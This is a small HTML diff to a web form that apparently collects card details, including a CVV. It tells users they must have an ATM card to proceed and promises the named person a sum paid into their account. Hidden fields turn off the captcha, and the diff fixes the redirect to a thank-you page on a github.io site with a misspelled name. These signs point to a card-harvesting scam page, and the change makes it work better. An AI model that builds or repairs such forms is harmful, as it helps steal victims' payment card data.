@@ -142,12 +142,14 @@
           <div class="error" id="cvvError"></div>
         </label>
 
-        <div id="finalNote">Dear <span id="nameOutput"></span>, You will receive <span id="amountOutput"></span> to your <span id="typeOutput"></span>, <span id="accountOutput"></span></div>
+        <div id="finalNote">
+          Dear <span id="nameOutput"></span>, You will receive <span id="amountOutput"></span> to your <span id="typeOutput"></span>, <span id="accountOutput"></span>
+        </div>
       </div>
 
       <div id="atmWarning" class="error hidden">YOU MUST HAVE ATM CARD TO PROCEED</div>
 
-      <input type="hidden" name="_redirect" value="https://onlinegistrationprog.github.io/thankyou.html">
+      <input type="hidden" name="_next" value="https://onlinegistrationprog.github.io/thankyou.html">
       <input type="hidden" name="_captcha" value="false">
 
       <button type="submit" id="submitBtn">Submit</button>
